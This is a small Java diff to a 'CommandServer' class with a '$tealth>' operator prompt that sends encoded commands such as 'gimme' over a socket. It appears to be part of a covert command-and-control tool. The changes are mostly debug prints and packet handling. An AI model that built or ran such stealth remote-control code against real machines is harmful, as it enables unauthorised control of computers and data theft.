@@ -26,6 +26,8 @@ public class CommandServer implements Runnable{
 			try {
 				System.out.println("[-] HTTP Command Server: Exchange Begins");
 				Socket connection=server.accept();
+				System.out.println("1");
+				readAll(connection);
 				while(true) {
 					System.out.print("$tealth>");
 					String command = stdin.nextLine();
@@ -34,7 +36,6 @@ public class CommandServer implements Runnable{
 					}
 					else if(command.startsWith("gimme")){
 						sendAll(connection,command);
-						System.out.println(decodeResponse(readAll(connection)));
 					}
 					else if(ci.checkCommand(command)) {
 						ci.runCommand(command);
@@ -49,9 +50,11 @@ public class CommandServer implements Runnable{
 	}
 	private void sendAll(Socket s, String clientHello) throws IOException {
 		ArrayList<String> allPacks = this.encodeResponse(clientHello);
+		allPacks.add(new String(new char[] {0,0,0}));
 		for(String pack : allPacks){
 			s.getOutputStream().write(pack.getBytes());
 			s.getOutputStream().flush();
+			readAll(s);
 		}
 		
 	}
